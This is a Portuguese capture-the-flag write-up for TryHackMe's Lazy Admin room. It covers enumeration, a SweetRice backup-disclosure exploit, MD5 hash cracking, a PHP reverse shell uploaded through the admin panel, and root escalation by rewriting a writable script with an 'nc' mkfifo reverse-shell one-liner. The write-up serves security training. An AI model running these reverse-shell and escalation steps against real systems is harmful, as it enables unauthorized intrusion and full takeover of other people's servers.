# Lazy Admin Writeup

> [!NOTE] 
> **[EN]** This version of the writeup is in portuguese. Click [here]() or follow [this link (github)]() to go to the english version.

> **Link para o desafio CTF**: [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin)
> **Dificuldade:** `Fácil`
> **Data de Resolução:** `2026/04/28`
## Sumário

> Link do writeup no github: [https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Lazy%20Admin/(PT-BR)%20LazyAdmin%20Writeup.md](https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Lazy%20Admin/(PT-BR)%20LazyAdmin%20Writeup.md)

- [Ferramentas Utilizadas](#ferramentas%20utilizadas)
- [Resolução do CTF](#Resolução%20do%20CTF)
	1. [Reconhecimento](#Reconhecimento)
	2. [Exploração](#Exploração)
	3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
- [Conclusão](#Conclusão)
- [Referências](#Referências)
## Ferramentas Utilizadas

Para este CTF, foram utilizadas as seguintes ferramentas:
- [Nmap](https://nmap.org/)[^nmap]: ferramenta de exploração da internet, criada para escanear rapidamente redes de larga escala. O Nmap realiza diversas requisições para um IP para determinar quais hosts estão disponíveis naquela rede, quais serviços que eles oferecem (por exemplo, HTTP, ssh, ...), quais sistemas operacionais (e versões destes) estão utilizando dentre outras informações. Sendo uma ferramenta poderosa para a enumeração de serviços e fornecimento de informações básicas sobre os hosts de uma rede, dados essenciais para alguém que está tentando invadir um sistema, o Nmap é muito utilizado em situações de pentesting e geralmente faz parte do primeiro passo nos CTFs.
- [Gobuster](https://github.com/OJ/gobuster)[^gobuster]: ferramenta responsável por enumerar por força bruta diretórios e arquivos, detectar subdomínios DNS e hosts virtuais, dentre outras funções. Por ser de alta performance, o Gobuster é essencial para agilizar o processo de encontrar diretórios de sistemas, poupando o desgaste da pessoa invasora de procurá-los manualmente, sendo, portanto recomendado para CTFs e pentesting.
- [Netcat](http://www.stearns.org/nc/)[^netcat]: programa basico de Unix responsável por ler e escrever dados através de conexões de rede. Em um contexto de pentesting, o netcat é uma ótima ferramenta para criar conexões com os sistemas na rede e ter acesso a eles de forma remota, permitindo técnicas como a de reverse shell, muito importante também nos contextos de CTF.
- [hashID](https://psypanda.github.io/hashID/)[^hashid]: ferramenta de identificação de algoritmos de hash. Ela é capaz de identificar um único hash ou um arquivo contendo vários hashes únicos, e pode indicar o modo para usar em ferramentas como `hashcat`[^hashcat] e `JohnTheRipper`[^john], ferramentas de quebra de hash.
- [hashcat](https://hashcat.net/)[^hashcat]: ferramenta de recuperação de senhas, usada para atacar algoritmos de hash. Ela pode ser usada em diversos modos, como força bruta (podendo ser auxiliado por uma máscara), lista de dicionário (como a lista de senhas vazada da RockYou[^rockyou]), dentre outros. 
- [searchsploit](https://www.exploit-db.com/searchsploit)[^searchsploit]: ferramenta de pesquisa da [Exploit Database](https://www.exploit-db.com)[^exploitdb] que permite buscar por CVEs e outras vulnerabilidades de forma offline pelo terminal. As Common Vulnerabilities and Exposures[^CVE] são referências públicas a vulnerabilidades de segurança e a  [Exploit Database](https://www.exploit-db.com)[^exploitdb] contém uma lista dessas vulnerabilidades, com descrições e modos de replicar. O `searchsploit`[^searchsploit] permite que o processo de busca seja feito rapidamente por meio do terminal e é muito utilizado em contextos de penetration tests e CTFs.

Bem como recursos como:
- [Reverse Shell Generator (revshells)](https://www.revshells.com/)[^revshellgen]: site contendo códigos e comandos para gerar shells reversas de diversas maneiras, sendo então flexível para cada situação
- [GTFOBins](https://gtfobins.org/)[^gtfo]:  lista de executáveis estilo Unix que permitem ultrapassar restrições de segurança em sistemas vulneráveis, muito útil para realizar escalação de privilégio. Assim como o site anterior, contém um compilado de funções para várias situações.


## Resolução do CTF

O CTF Lazy Admin, disponível no TryHackMe, é um desafio de dificuldade fácil que requer a exploração de um sistema para achar a flag de usuário e de root. Neste CTF foi-se utilizada uma vulnerabilidade do SweetRice[^sweet], descoberta com o `searchsploit`[^searchsploit]. 

Após conectar-me ao VPN do TryHackMe, obtive acesso à maquina e iniciei o desafio. A estratégia usada foi dividida em duas partes:

1. [Reconhecimento](#Reconhecimento)
2. [Exploração](#Exploração)
3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)

Para facilitar a entrada de argumentos, adicionei ao `etc/hosts` uma relação entre o IP da máquina vulnerável com um nome de domínio (`vul.net`). Com tudo preparado, comecei o reconhecimento.

### Reconhecimento

A primeira coisa que fiz para o reconhecimento da máquina-alvo foi uma enumeração da rede com o `nmap`[^nmap], executando:

```sh 
nmap -T4 -A vul.net
```

em que `-T4` representa o template de temporização (de 0 a 5, quanto maior, mais rápido, ou seja, mais interações e menos discrição, o que não costuma ser um problema em CTFs básicos) e `-A` habilita a detecção de SO, detecção de versão, traceroute e scan de scripts. Dados relevantes da enumeração estão a seguir:

```bash
nmap vul.net -A -T4    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-28 13:33 -0400
Nmap scan report for vul.net (<TARGET_IP>)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
#[...]
```

em que percebi que o sistema era baseado em Apache, com as portas 22 e 80 abertas (ssh e http). Como o serviço http estava disponível, e como a página padrão estava funcionando normalmente, decidi explorá-lo. Todavia, enquanto eu abria a página web, já decidi executar um comando no `gobuster`[^gobuster], para adiantar a enumeração de diretórios:

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/common.txt -u http://vul.net/ -x php,html,txt -t 50
```

Este comando busca os diretórios com a wordlist fornecida (`-w`, com uma wordlist contendo uma lista de diretórios mais comuns), no url fornecido (`-u`) e com as extensões fornecidas (`-x`, em que coloquei as mais comuns como php, html e txt), na quantidade de threads fornecida (`-t`, e, mais uma vez, discrição não é essencial nesse CTF, então o número escolhido foi alto para agilizar o processo). O resultado final obtido foi o seguinte:

```sh
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vul.net
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
#[...]
content              (Status: 301) [Size: 304] [--> http://vul.net/content/]
index.html           (Status: 200) [Size: 11321]
index.html           (Status: 200) [Size: 11321]
server-status        (Status: 403) [Size: 272]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

Tendo acesso ao diretório `/content`, também enumerei os diretórios a partir dali. Os resultados dessa enumeração podem ser vistos abaixo e serão discutidos juntamente dos resultados da enumeração acima na fase de exploração:

```sh
$ gobuster dir -u http://vul.net/content -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vul.net/content
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
#[...]
_themes              (Status: 301) [Size: 312] [--> http://vul.net/content/_themes/]
#[...]
as                   (Status: 301) [Size: 307] [--> http://vul.net/content/as/]
attachment           (Status: 301) [Size: 315] [--> http://vul.net/content/attachment/]
changelog.txt        (Status: 200) [Size: 18013]
images               (Status: 301) [Size: 311] [--> http://vul.net/content/images/]
inc                  (Status: 301) [Size: 308] [--> http://vul.net/content/inc/]
index.php            (Status: 200) [Size: 2193]
index.php            (Status: 200) [Size: 2193]
js                   (Status: 301) [Size: 307] [--> http://vul.net/content/js/]
license.txt          (Status: 200) [Size: 15410]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

### Exploração

Ao acessar `http://vul.net`, deparei-me com a página padrão do Apache, que não continha nenhuma informação relevante:

![pagina inicial](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_index.png)

Com os dados da enumeração de diretórios de `http://vul.net`, o único além de `/index` era o `/content`, que era a página padrão do SweetRice[^sweet]:

![sweetrice_page](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_content.png)

Decidi fazer mais uma enumeração de diretórios, dessa vez em `http://vul.net/content` e encontrei diversos diretórios, a maioria não contendo informações úteis, mas em `http://vul.net/content/as`, encontrei uma página de login:

![pagina inicial](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_as.png)

Como eu não tinha credenciais para entrar, decidi, por meio do `searchsploit`[^searchsploit], ver se havia alguma vulnerabilidade para o SweetRice:

```bash
$ searchsploit sweetrice
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                        | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                     | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                      | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                        | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                            | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                   | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution              | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                          | php/webapps/14184.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Após ler um pouco sobre as vulnerabilidades mais promissoras (`Arbitrary File Download`, `Arbitrary File Upload`, `Backup Disclosure`, `Cross-Site Request Forgery / PHP Code Execution`), decidi começar com a `Backup Disclosure (40718)`[^EDB-40718], por ser a mais simples, isto é, não envolver muitos passos:

```
$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt 
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

Ao acessar `http://vul.net/content/inc/mysql_backup`, pude fazer o download do backup do banco de dados:

![sql backup page](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_backup.png)

Lendo o arquivo de backup encontrei a seguinte linha:

```sql
 --[...]
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
 --[...]
```

Esta linha contém um array associativo, em que aparece a chave `admin` relacionada a `manager` e `passwd` associada ao hash `42f749ade7f9e195bf475f37a44cafcb`. Assim, identifiquei o hash com o `hashid`[^hashid]: 

```bash
$ hashid -m '42f749ade7f9e195bf475f37a44cafcb'
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
#[...]
```

em que `-m` retorna o modo que deve ser usado pelo `hashcat`[^hashcat] para cada hash identificado. E testei com `MD5` no `hashcat`[^hashcat] (no comando abaixo, `-a` indica o modo de ataque, que foi por dicionário; `-m` indica o tipo do hash, que é o `MD5`; e a wordlist escolhida foi a `rockyou.txt`[^rockyou]):

```sh
$ hashcat -a 0 -m 0 '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt
#[...]
42f749ade7f9e195bf475f37a44cafcb:<PASSWORD>                    

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: cbfdac6008f9cab4083784cbd1874f76618d2a97
#[...]

```

Com isso, usei o usuário `manager` e a senha `<PASSWORD>` para passar da página de login e me deparei com o painel de administração do site:

![sql backup page](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_panel.png)

Após procurar um pouco por um ponto de acesso, encontrei a página para propagandas e descobri que poderia colocar qualquer script, então peguei um script de `php` para gerar uma reverse shell[^reverseshell] a partir do código fornecido em [revshells.com](https://www.revshells.com/)[^revshellgen] e salvei:

![sql backup page](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_ads_page.png)

Esse código foi parar em um arquivo em `http://vul.net/content/inc/ads`:

![sql backup page](UnB/Offsec/CTFs/Lazy%20Admin/assets_lazy/lazy_shell.png)

Abri uma escuta com o netcat[^netcat]:

```bash 
netcat -lnvp 1234 
```

contendo os seguintes argumentos argumentos:
- `-l`: modo de escuta, justamente para receber as informações do terminal do outro sistema
-  `-n`: desativar o DNS, uma vez que já temos o IP direto, não é necessário ficar resolvendo nomes, deixando o netcat mais rápido
-  `-v`: modo verboso, para ter mais informações, no caso de problemas, por exemplo
-  `-p`: indica a porta de escuta, no caso `1234`

E executei o programa ao clicar no arquivo e estabilizei a shell para navegar melhor no terminal. Assim, tive acesso ao usuário `www-data` por meu terminal:

```bash
www-data@THM-Chal:/$ whoami
www-data
```

Entrando em `/home/itguy`, encontrei a `<USER_FLAG>` em `user.txt`:

```
www-data@THM-Chal:/home/itguy$ cat user.txt
<USER_FLAG>
```
### Escalação de Privilégios

Por fim, era necessário escalar privilégios e encontrar a flag em `/root`. Para isso, testei no terminal as permissões do usuário:

```sh
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
    
www-data@THM-Chal:/home/itguy$ ls -l backup.pl 
-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl

www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

O usuário "www-data" tinha permissão privilegiada para executar o script em perl, `backup.pl`, porém eu não podia editá-lo, como pode ser visto acima. Apesar disso, ao ler os conteúdos deste arquivo, percebi que ele chamava a execução do arquivo `copy.sh`, o qual eu possuía permissão para alterar.

```sh
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Como pode ser visto acima, `copy.sh` contém literalmente o código para uma shell reversa, então bastou alterá-lo para o meu ip e executar `backup.pl` de forma privilegiada:

```sh
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_IP> 5554 >/tmp/f" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_IP> 5554 >/tmp/f
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Abri uma escuta do `netcat`[^netcat] e obtive acesso ao root:

```
$ netcat -lnvp 5554
# whoami
root
```

Ao listar os conteúdos de root, encontrei o arquivo, `root.txt`, que continha a `<ROOT_FLAG>`:

```
# cd /root
# ls
root.txt
# cat root.txt
<ROOT_FLAG>
```

e finalizei o CTF.
## Conclusão

O CTF Lazy Admin permitiu explorar uma vulnerabilidade listada pela Exploit Database do SweetRice quanto ao acesso livre de backups de bancos de dados do sistema, o que permitiu encontrar dados sensíveis e obter acesso à página de administração do site. A partir disso, foi possível abrir uma reverse shell e, posteriormente, escalar privilégios, de formas simples, para achar as flags desse desafio.
## Referências

[^nmap]: Nmap: [https://nmap.org/](https://nmap.org/)
[^gobuster]: Gobuster: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
[^netcat]: Netcat: [http://www.stearns.org/nc/](http://www.stearns.org/nc/)
[^hashid]: Hashid: [https://psypanda.github.io/hashID/](https://psypanda.github.io/hashID/)
[^hashcat]: Hahscat: [https://hashcat.net/](https://hashcat.net/)
[^revshellgen]: Reverse Shell Generator (revshells): [https://www.revshells.com/](https://www.revshells.com/)
[^rockyou]: RockYou:
	- Sobre Rockyou e o vazamento de suas senhas: [https://en.wikipedia.org/wiki/RockYou](https://en.wikipedia.org/wiki/RockYou)
	- Wordlist `rockyou.txt`: [https://weakpass.com/wordlists/rockyou.txt](https://weakpass.com/wordlists/rockyou.txt)
[^jhon]: JhonTheRipper: https://www.openwall.com/john/
[^searchsploit]: Searchsploit: [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)
[^exploitdb]: Exploit Database (Exploit-DB): [https://www.exploit-db.com](https://www.exploit-db.com)
[^CVE]: Sobre CVEs: [https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)
[^gtfo]: GTFOBins: [https://gtfobins.org/](https://gtfobins.org/)
[^sweet]: Site do SweetRice: [https://www.sweetrice.xyz/](https://www.sweetrice.xyz/)
[^EDB-40718]: Backup Disclosure (40718): [https://www.exploit-db.com/exploits/40718](https://www.exploit-db.com/exploits/40718)
[^reverseshell]: Sobre reverse shells: [https://en.wikipedia.org/wiki/Shell_shoveling](https://en.wikipedia.org/wiki/Shell_shoveling)
